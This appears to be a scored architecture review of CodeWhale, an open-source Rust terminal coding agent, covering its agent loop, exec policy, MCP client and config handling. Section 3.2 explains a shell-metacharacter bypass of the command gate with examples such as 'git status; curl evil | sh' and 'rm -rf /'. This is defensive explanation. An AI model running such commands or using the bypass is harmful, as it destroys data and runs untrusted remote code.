> **CodeWhale — harness analysis.** An open-source (MIT, Rust) terminal coding agent — a TUI + CLI
> that drives any of ~25 model providers through one streaming agent loop. Analyzed 2026-06-21 · 18M ·
> source: https://github.com/Hmbown/CodeWhale.
> Scope: whole harness. Method: vendor → parallel read-only fan-out (5 domains) → synthesis.

This is a **Mode-A** harness review (neutral deep-dive + scored quality assessment), produced by the
`nxtlvl:harness-review` skill. It is the **3rd landed whole-harness Mode-A** after
[`deepagents-analysis.md`](deepagents-analysis.md) and [`hive-analysis.md`](hive-analysis.md), and the
first reviewed *real* CC-competitor coding runtime (vs. LangChain-layer deepagents / actor-model hive).

---

## 1. Overview & thesis

CodeWhale is a genuinely shipped, dogfooded terminal coding agent in the Codex/Claude-Code mold: point
it at a model and a repo and it reads code, edits, runs commands, checks results, plans multi-step
work, and self-corrects. Its differentiator is **model-agnosticism** — DeepSeek and open-weight models
are first-class peers to Claude/GPT/Kimi/local vLLM-Ollama — and it backs that with one streaming agent
loop wired to 25 providers across three wire formats (OpenAI chat, OpenAI Responses, native Anthropic).

**The spine (Phase-4 synthesis), and it is the same finding from all five independent agents:
reference-grade *engine craft* sitting on *mid-migration structural drift*.** The robustness
engineering is excellent and real — transparent stream-retry vs sleep-resume disambiguation,
corruption-safe auto-compaction, anti-spin loop guards, hardened MCP transports, fail-loud secrets,
race-safe SQLite accounting, untrusted-project-config sandboxing. But the harness is **structurally
dishonest about where it lives**: the crate names actively mislead. `crates/agent`, `crates/core`, and
`crates/whaleflow` are *not* the agent loop — the real loop, runtime, tools, sandbox, and MCP client
all live inside a 320K-LOC god-crate `crates/tui`. And nearly everything load-bearing is **shipped
twice**: two agent runtimes, two provider registries, two MCP implementations, and a beautifully-typed
workflow DSL (`whaleflow`) that *nothing executes*.

That duplication is the recurring "encoded N×, sourced from a single truth 0×" shape this workbench has
flagged in ruflo and SuperClaude — but here it appears in a *competent, production* harness, as
**built-but-unwired / coexisting-during-migration** rather than copy-paste filler. That distinction
matters: it shows even a strong team pays the drift tax when the contract isn't single-sourced, which
is the cleanest external validation of nxtlvl's "single-source the contract, multi-source the delivery"
position that any reviewed harness has produced.

---

## 2. Architecture map

CodeWhale is a 15-crate Cargo workspace. The advertised layering (an `agent` crate, a `core` runtime,
a `whaleflow` orchestrator, thin UI shells) is **not** how the shipped system is wired. The real shape:

| Layer | Where the docs say it is | Where it actually ships |
|---|---|---|
| Agent loop / orchestration | `crates/whaleflow` ("orchestration overlay") | `crates/tui/src/core/engine/turn_loop.rs` (3,382 L) |
| Headless runtime | `crates/core::Runtime` (the canonical one) | **two** runtimes — `crates/core` (thin, newer) **and** `crates/tui/src/core/engine` (fat, mature) |
| Tools / exec gate / sandbox | `crates/tools` + `crates/execpolicy` | gate is real in `crates/execpolicy`; **tool impls + sandbox live in `crates/tui/src/{tools,sandbox}`** |
| Provider registry | `crates/config/src/provider.rs` (macro registry) | metadata-only; agent runs on a **second** registry in `crates/tui/src/config.rs` (12,261 L) |
| MCP client | `crates/mcp` | in-memory **stub**; real client is `crates/tui/src/mcp.rs` (5,927 L) |
| Workflow engine | `crates/whaleflow` (typed IR + Starlark/JS authoring) | **orphan** — no crate depends on it; never executed |
| Interface shells | `crates/cli`, `crates/tui`, `crates/app-server` | `cli` is a thin argv dispatcher → spawns sibling `tui` binary; `app-server` wraps `crates/core` |

**Control flow of a real session:** `codewhale` (CLI dispatcher, `crates/cli/src/lib.rs:164`) collects
argv and **spawns the sibling `codewhale-tui` binary** (`cli/src/lib.rs:1954`), which re-parses the same
clap enum and runs the engine in `crates/tui/src/core/engine`. The `app-server` crate is a *separate*
headless path over the *other* (`crates/core`) runtime, which the CLI help even nudges new integrations
toward (`cli/src/lib.rs:246`) — i.e. the codebase is visibly mid-migration from the fat TUI runtime to a
thin canonical one, with both live.

Partition used for analysis (5 independent domains, no shared state): (1) runtime & orchestration,
(2) tools/execpolicy/hooks/secrets, (3) provider/protocol/MCP, (4) state/config/memory, (5) interface
surfaces.

---

## 3. Component deep-dives

### 3.1 Agent runtime & orchestration

The per-turn orchestrator is `Engine::handle_deepseek_turn` (`crates/tui/src/core/engine/turn_loop.rs:71`):
an outer step loop (`:107`) wrapping an inner stream-drain loop (`:513`). Each step drains live **steer**
input (mid-turn user injection, `:113-130`) and **sub-agent completions** (`:137`), refreshes the system
prompt, runs **corruption-safe auto-compaction** when over budget ("never corrupt state", `:156-233`),
enforces a bounded context-overflow recovery (`:235-261`), checks **prefix-cache stability** for KV-cache
reuse (`:301-392`), then streams and executes the tool batch behind a long planning gate (mode checks,
deny>allow lists, approval computation, `:1329-1516`).

The failure posture is the standout: a `LoopGuard` with `IdenticalToolCall` + `NoProgressToolLoop`
detection (`core/engine/loop_guard.rs:27-84`) returns an anti-spin error *into context* rather than
hard-killing; transparent stream-retry re-issues a dead request without double-billing and is
disambiguated from laptop-sleep via monotonic-vs-wallclock divergence (`turn_loop.rs:587-662`); the
whole turn is wrapped in an `AssertUnwindSafe` panic catch (`engine.rs:2208`). **Modes are genuinely
enforced in the loop** (Plan mode blocks exec tools, `turn_loop.rs:1365-1380`), and a real big/cheap
**auto-router** picks a model without ever fabricating one (`model_routing.rs:43-132`).

Subagents are the real fan-out spine (`crates/tui/src/tools/subagent/mod.rs`, 5,523 L): a single
model-facing `agent` tool, children built from a **role/capability profile** (`WorkerRuntimeProfile`/
`ToolScope`, `:45`) — "built directly from a profile, not build-everything-then-filter"
(`docs/AGENT_RUNTIME.md:88`) — capped at `MAX_SUBAGENTS = 20`, with the parent **not barriering** on
children and child transcripts **never** flowing back (only a result summary + compact lifecycle events,
`AGENT_RUNTIME.md:84-90`). `goal_loop.rs` is a genuine "run until done" persistence layer.

**The `whaleflow` crate is an orphan.** No crate depends on it; `WorkflowPlan`/`compile_starlark_workflow`
have zero references outside the crate. Its own doc admits it "deliberately stops at the Rust-owned IR
boundary" with runtime execution "layered on top only *after*… semantics are proven"
(`crates/whaleflow/src/lib.rs:3-5`). The shipped "WhaleFlow substrate" (`worker_profile.rs:5`,
`goal_loop.rs:8`) is *prose labelling* over hand-rolled logic that never consumes the typed IR.

*Scores (cohesion + effectiveness weighted up):* Coh **3.5** (shipped loop is coherent but crate names
mislead) · Comp **4** (one runtime reused across TUI/exec/subagent) · Rob **4.5** (retry/sleep/compaction/
LoopGuard all real) · Disc **3** (spine undiscoverable from crate names) · Clar **2.5** (god-files +
module-wide `allow(dead_code)`) · Eff **4**.

### 3.2 Tools, execution policy, hooks & secrets

Clean separation of concerns: `crates/tools` is a pure dispatcher (a `ToolHandler` async trait,
`tools/src/lib.rs:325`; registry with `is_mutating` rejection + reentrancy-safe RW-lock guard +
optional timeout, `:433-486`) — it has **no opinion on safety**. The real gate is `crates/execpolicy`,
wired pre-execution at `crates/core/src/lib.rs:1292` (refuses on `!decision.allow`). Evaluation order:
**deny always wins** with word-boundary matching so `rm` blocks `rm -rf /` but not `rmdir`
(`execpolicy/src/lib.rs:358-363`), then trusted/allow rules via the **arity dict** (`bash_arity.rs`) — a
200-entry `(prefix, arity)` table that strips flags so `auto_allow=["git status"]` matches
`git status --porcelain` but not `git push` (`:304-336`). Rulesets are layered Builtin<Agent<User with
deny merged across all layers.

**Critical safety gap (verified):** execpolicy tokenizes purely via `command.split_whitespace()`
(`bash_arity.rs:352`, `lib.rs:482`) — it does **not** parse shell metacharacters. So
`git status && rm -rf /` or `git status; curl evil | sh` or `$(rm -rf /)` classifies on the *first*
segment only; a trusted prefix becomes a carrier for arbitrary follow-on commands. The arity dict is
safe only on already-split single commands; it is not a shell parser.

`crates/hooks` is **not** a CC-style gate — it is best-effort observability event emission (a `HookEvent`
enum fanned to stdout/JSONL/webhook/unix-socket sinks); `emit` discards every sink error
(`hooks/src/lib.rs:306-310`), with no exit codes, no kill switch, no veto. The *blocking* is execpolicy's
job; hooks merely report the decision. `crates/secrets` is the best-engineered crate in scope: a
keyring/file/in-memory `KeyringStore` trait that enforces `0600`/`0700` and **rejects** world-readable
files on read (`:456-461`), with a headline fix (#281) that propagates read errors instead of
`unwrap_or_default()` because the old fallback "silently wipes every previously stored secret"
(`:511-518`), guarded by three regression tests — and a copy-not-move legacy migration (`:1062`).

*Scores (robustness weighted heaviest):* Coh **5** · Comp **4** · Rob **3** (secrets + deny-logic are 5s,
but the no-metachar gate is a structural hole a safety-critical layer can't have) · Disc **4** · Clar **5**
(exceptional inline rationale tying code to issue #s) · Eff **3.5** ("execpolicy" implies shell-safety it
doesn't deliver against compound commands).

### 3.3 Provider integration, protocol & MCP

Provider definitions are data-driven via a `provider!` macro that generates 23 of the 25 registered
provider structs from one-line specs (`crates/config/src/provider.rs:73-122`; the 25-entry
`PROVIDER_REGISTRY` at `:514` adds 2 hand-rolled structs) — but this trait is **metadata-only
and admits it** ("does not mutate request bodies… runtime routing remains in `resolve_runtime_options`",
`:3-5`); its `WireFormat` enum is never consumed outside a parity test. The **real** provider/wire system
is a parallel hand-coded one in `crates/tui/src/config.rs` (12,261 L), kept in lockstep with the macro
registry by a 363-line CI drift-checker (`scripts/check-provider-registry.py`, `docs/PROVIDERS.md:17-29`).

The `crates/protocol` crate is the app-server↔client envelope/event protocol (a rich `EventFrame`
streaming enum with text/reasoning channel split, MCP lifecycle, approvals — `protocol/src/lib.rs:633-714`),
*not* the model wire protocol. Cross-provider normalization is three hand-rolled adapters in
`crates/tui/src/client/` (`chat.rs` 4,197 L, `anthropic.rs` 958 L, `responses.rs` 936 L); the Anthropic
adapter is faithful — full SSE grammar, thinking/signature/tool-arg streaming, fixture-tested
(`anthropic.rs:450-481, 817-894`).

The shipped MCP client is `crates/tui/src/mcp.rs` (5,927 L) — entirely separate from `crates/mcp` (a
1,406-L in-memory **stub** + JSON-RPC stdio *server* for testing, `crates/mcp/src/lib.rs:633-677`). The
real client implements a `McpTransport` trait with stdio (SIGTERM→SIGKILL graceful shutdown + bounded
stderr ring, `:527-584`), legacy SSE, and Streamable HTTP, with **stale-session reconnect-retry**
(`:2537-2552`), session-ID chicken-and-egg preflight (`:1381-1391`), and proxy support with credential
redaction (`:1346-1357`). Two real bugs-in-waiting: tools surface under single-underscore
`mcp_{server}_{tool}` (`:2145`) while the stub + protocol crates use CC-standard double-underscore
`mcp__{server}__{tool}` (a CC-trained model emits `mcp__…`; the live parser strips `mcp_` and works *by
accident*); and the protocol is pinned to `2024-11-05` with elicitation half-wired (the `EventFrame`
variant exists but `tui/src/mcp.rs` never handles a server elicitation request).

**CC-plugin compat does NOT run CC plugins:** it ingests only bare `SKILL.md` instruction bundles and
explicitly drops `plugin.json`, slash-commands, agents, hooks, and shared state
(`docs/CLAUDE_PLUGIN_COMPAT.md:18-27`), *rejecting* multi-skill archives rather than silently picking one
(`:29-32`).

*Scores (robustness + composition weighted up):* Coh **3** · Comp **2.5** (excellent macro reuse, but
two registries + two MCP impls are the opposite of composition) · Rob **4** · Disc **4** · Clar **3** ·
Eff **4** (demonstrably works across four wire formats + three transports).

### 3.4 State, config & memory

Config precedence is hand-coded per concern (no single merge). The headline is **security-grade**:
repo-local `.codewhale/config.toml` is treated as **untrusted** — `merge_project_overrides`
(`crates/config/src/lib.rs:1595`) whitelists only model/output/tools and lets approval_policy +
sandbox_mode **tighten but never loosen** (`:2078`, `:2089`); credentials/endpoints/network are ignored.
The API-key chain is explicit (CLI flag → config → keyring → env, `:1830`). `crates/state` is SQLite +
an append-only JSONL index with `PRAGMA user_version` migrations 1→4 in transactions (`:312`),
tree-structured messages enabling fork/branch (`:1024-1146`), and **race-safe goal accounting** via
store-side `col = col + ?` + `updated_at = MAX(updated_at, ?)` with adversarial stale-`now` tests
(`:816, :1909`). Permissions are written atomically (tempfile → `0600` → `sync_all` → rename, `:3354`).

**The standout weakness:** `config.toml` itself is written **non-atomically** — `ConfigStore::save`
opens the real path with `truncate(true)` + `write_all` in place (`:2877, :2906`), so a crash mid-write
leaves a truncated, unparseable config, with only a *one-time* backup as backstop. The crate that wrote a
perfectly atomic `permissions.toml` writer **did not reuse it** for the primary config — a direct
"lying-state" risk and a clean teaching contrast. Also: top-level `ConfigToml` uses `#[serde(flatten)]
extras` (`:660`) so a typo'd top-level key is silently absorbed (sub-tables use `deny_unknown_fields`);
checkpoints deserialize with `unwrap_or(Value::Null)` (`:1278`) — quiet data loss.

**Memory model** (`docs/MEMORY.md`) is *exactly* nxtlvl's locked bet: a single curated `~/.codewhale/
memory.md` of timestamped Markdown bullets — **no vector DB, not the transcript** — injected into the
system prompt above the prefix-cache boundary, re-read each turn, 100 KiB cap, opt-in, with three write
paths (`#` prefix, `/memory`, a model-facing `remember` tool). It is **write-heavy by design** (the model
auto-appends), the inverse of nxtlvl's recall-over-write-volume posture. (Implementation lives in the TUI
crate, not the scoped state/config crates — documented, not code-verified in this domain.)

*Scores (robustness + clarity weighted up):* Coh **4** · Comp **3** (atomic writer not reused for config)
· Rob **3.5** · Disc **4** · Clar **4.5** (outstanding inline *why*-next-to-*what*) · Eff **4**.

### 3.5 Interface surfaces (CLI · app-server · TUI)

**The "320K-LOC TUI" is a measurement artifact, not UI craft** — it is the `wc -l` total over a fat
monolith crate, of which the actual ratatui rendering (`tui/src/tui/`) is ~97K and **half the crate is
inline tests** (5,059 test fns across 291 files; `config.rs` tests start at line 6044). It is real
hand-written, well-tested code (zero snapshot fixtures, no vendored deps) — but the headline number
conflates a god-crate with a large test mass and must not be scored as UI craft.

`crates/cli` is a thin clap-derive dispatcher (`:164`); most subcommands are `trailing_var_arg`
passthroughs that forward argv to the sibling `codewhale-tui` binary (`:1954`), with a **best-in-class
not-found error** that diagnoses the dispatcher/sibling split and lists three install channels (`:1974`).
`crates/app-server` is a headless axum transport over `crates/core::Runtime` with an OpenAI-compatible
`/chat/completions` endpoint and **auth-by-default** (auto-generates a `cwapp_<uuid>` token, rejects
empty tokens, refuses unauthenticated non-loopback binds — `app-server/src/lib.rs:388-414`). The TUI is
ratatui 0.30 + crossterm 0.28 and hosts its *own* engine plus a *second* axum HTTP/SSE server
(`runtime_api.rs`, 6,678 L) that `serve --http` aliases to — so there are **two HTTP servers over two
runtimes**, and UI/logic separation is clean *within* the TUI crate but broken at the crate boundary
(the TUI re-implements the engine instead of consuming `crates/core`).

*Scores (clarity + discoverability weighted up):* Coh **3** · Comp **2** (TUI re-implements the engine) ·
Rob **4** (auth-by-default; docked for `==` token compare at `:455`) · Disc **4** (excellent per-command
`after_help` examples + 5-shell completions) · Clar **3** (god-crate + 11K-line `ui.rs`) · Eff **4**.

---

## 4. Strategy & workflow

A task flows: **`codewhale <cmd>` (CLI dispatcher) → spawn sibling `codewhale-tui` → re-parse argv → TUI
engine turn loop**. Inside the loop, each step composes a system prompt (with the curated memory block
placed for prefix-cache stability), streams from the resolved provider through a hand-rolled wire
adapter, parses tool-use blocks, and runs each tool through the execpolicy gate (deny>allow, arity-dict
classification, approval-mode computation) before execution — emitting best-effort observability events
to hooks the whole way. Multi-step persistence is durable (SQLite threads/messages/goals with fork
support); sub-agents fan out up to 20-wide from profile-built toolsets, returning summaries (never
transcripts) on later turns; a goal loop runs "until done." Auto-compaction and context-budget recovery
keep long sessions alive; a big/cheap auto-router trades cost against capability per turn.

**What it optimizes for:** model-agnostic reach (25 providers, 3 wire formats) and long-session
resilience (compaction, retry, loop guards, durable state) — the things a *daily-driver* coding agent
lives or dies on. **The tradeoff it bought:** structural debt. To ship fast and dogfood, it grew a TUI
god-crate that became the de-facto runtime, then started a migration to a clean `crates/core` runtime it
hasn't finished — leaving duplicate runtimes/registries/MCP-clients and an aspirational `whaleflow` DSL
stranded ahead of its executor. The robustness is paid-for and real; the architecture diagram is
aspirational.

---

## 5. Quality assessment

| # | Dimension | Overall | Justification |
|---|-----------|:---:|---------------|
| 1 | Cohesion & purpose | **3** | Each *shipped* component is single-purpose, but crate names actively mislead (`agent`/`core`/`whaleflow` aren't the loop), two runtimes coexist, and `whaleflow` is an orphan (`whaleflow/src/lib.rs:3-5`). |
| 2 | Composition & reuse | **3** | Strong within-component reuse (provider macro, store/sink traits, one turn loop across surfaces) is offset by everything-shipped-twice: registries, MCP clients, runtimes (`tui/config.rs` vs `config/provider.rs`; `tui/mcp.rs` vs `crates/mcp`). |
| 3 | Robustness & safety | **4** | The genuine standout — retry/sleep/compaction/LoopGuard, hardened MCP transports, fail-loud secrets, race-safe + atomic state. Capped below 4.5 by the execpolicy no-metachar-parsing hole (`bash_arity.rs:352`) and non-atomic config save (`config/lib.rs:2877`). |
| 4 | Discoverability & triggering | **3.5** | Excellent CLI ergonomics (per-command examples, completions, the model-self-correcting tool errors) vs. a spine whose *location* is undiscoverable from names/docs and a serve/app-server alias maze. |
| 5 | Clarity & maintainability | **3** | Bimodal: exceptional inline rationale in secrets/state/config (issue #s next to the code) vs. god-files (`turn_loop.rs` 3,382 · `subagent/mod.rs` 5,523 · `tui/config.rs` 12,261 · `ui.rs` 11,090) and module-wide `allow(dead_code)`. |
| 6 | Effectiveness / fitness | **4** | A real, dogfooded, shipping product that demonstrably works across 25 providers, 3 wire formats, 3 MCP transports, with heavy test investment. |

**Headline verdict (~3.6/5).** CodeWhale is a **reference-grade coding-agent *engine* wearing a
mid-migration *architecture***. Where it touches the metal — streaming, retry, compaction, MCP
transport, secrets, durable state — it is as careful as the best harnesses reviewed here (deepagents,
hive), with failure paths engineered rather than asserted and rationale written next to the code. What
caps it is not a quality problem in any one component but a **structural-honesty problem across them**:
the system is shipped twice in its essentials and named for an architecture it doesn't run. A robustness
flaw (the shell-metacharacter-blind exec gate) and a "lying-state" flaw (non-atomic config save) keep
the robustness score from the top despite genuine 5-grade work nearby — exactly the "don't flat-average;
let the fatal flaw cap it" discipline. Who it's for: a developer wanting a fast, open, model-agnostic
terminal agent today (it delivers), not a team wanting a clean reference architecture to study (the map
lies about the territory).

---

## 6. Mining notes for nxtlvl

Every finding either confirms a nxtlvl LOCKED position or is a portable hygiene idiom — **no ADR
warranted**. The highest-value items are logged in the cross-harness backlog as `CW-02…CW-06` (joining `CW-01`,
the arity table from the scripts-review):

1. **ADOPT — arity-dict command classification, but ONLY behind a shell splitter** (upgrades the
   dangerous-bash gate). `bash_arity.rs:27-259` (the 200-entry table) + the word-boundary deny matcher
   (`execpolicy/lib.rs:358-363`, kills both the `rm`→`rmdir` over-block and the `git status`→`git statusX`
   under-block, with whitespace-collapse anti-evasion). This directly addresses nxtlvl's known
   false-positive on `git branch -f main`. **Load-bearing caveat:** CodeWhale classifies
   `split_whitespace()` output and never parses `;`/`&&`/`|`/`$()` (`bash_arity.rs:352`) — nxtlvl must
   split compound commands into segments and classify *each* before the dict is safe.
2. **ADOPT — fail-loud secrets/state discipline.** `secrets.rs:511-518` (never `unwrap_or_default()` a
   read before a write-back — the fallback silently wipes the store) + the atomic permissions writer
   (`config/lib.rs:3354`: tempfile→chmod→`sync_all`→rename). The *teaching moment* is that CodeWhale
   **had** the atomic writer and still shipped a non-atomic `config.toml` save (`:2877`) — concrete
   corroboration of nxtlvl's "no lying state, and the rule must be *uniform*" position (pairs with
   TREL-15, hooks-mastery).
3. **ADAPT — profile-built (not filter-after) subagent toolsets.** `WorkerRuntimeProfile`/`ToolScope`
   (`tui/src/tools/subagent/mod.rs:45`; `AGENT_RUNTIME.md:88`) build each child's surface from a role
   profile. Same lever as nxtlvl's **read-only-by-withheld-tools** scoped agents — CodeWhale validates it
   at 20-way fan-out, and its **non-barriering parent + summary-not-transcript handoff**
   (`turn_loop.rs:1109-1131`) externally confirms nxtlvl's small-fan-out + pointers-over-dumps posture.
4. **ADOPT — LoopGuard anti-spin primitive** (`core/engine/loop_guard.rs:27-84`): `IdenticalToolCall` +
   `NoProgressToolLoop` detection that returns an error *into context* rather than hard-killing — a
   small, portable pattern that fits **inform-don't-force** exactly.
5. **CONFIRMS (by counter-example) — single-source the contract.** The two-registry / two-runtime /
   two-MCP / orphan-DSL drift, and the 363-line CI drift-checker it requires (`PROVIDERS.md:25-28`), is
   the strongest external validation yet of nxtlvl's LOCKED single-source-and-route position — here in a
   *good* harness, proving even competent teams pay the drift tax. If duplication is ever unavoidable, a
   **scripted objective drift-gate** is the right mitigation (fits the §5 objective-audit discipline).
   The orphan `whaleflow` DSL is the "built-but-unwired" cousin of ruflo/SC's "copied-but-unrouted" —
   reinforcing that an artifact's value is its **reachability**, not its richness, and that
   native-execution beats a declarative overlay (CodeWhale's *shipped* orchestration is plain Rust;
   the typed engine is the dead part).
6. **MEMORY — confirms the curated-file bet, two refinements to steal** (`docs/MEMORY.md`): curated
   Markdown bullets, no vector DB, not the transcript, hand-editable, re-read each turn — *exactly*
   nxtlvl's model. Steal (a) **prefix-cache-stable placement** of the memory block, and (b) an explicit
   **"what stays OUT of memory"** curation contract. Note the inversion: CodeWhale's `remember` tool is
   write-heavy by design; nxtlvl's recall-over-write-volume is the safer bet (confirm-by-contrast).
7. **HYGIENE idioms** worth a note: MCP transport robustness (SIGTERM→SIGKILL + bounded stderr ring;
   stale-session reconnect-retry; credential redaction before logging — `tui/src/mcp.rs:527-584,
   2537-2552, 1346-1357`) for nxtlvl's own MCP scouts (deepwiki/context7); auth-by-default for any local
   server/listener (`app-server/lib.rs:388-402`, minus the non-constant-time `==` compare); the
   sibling-binary locator with a teaching not-found error (`cli/lib.rs:1954-1988`); and the
   **CC-plugin-compat boundary** — the runtime-portable unit of a CC plugin is the `SKILL.md` *prose*,
   not the plugin: an outside runtime drops nxtlvl's router/gates/hooks by design
   (`CLAUDE_PLUGIN_COMPAT.md:18-27`), so cross-harness reach, if it ever matters, lives in skill prose.
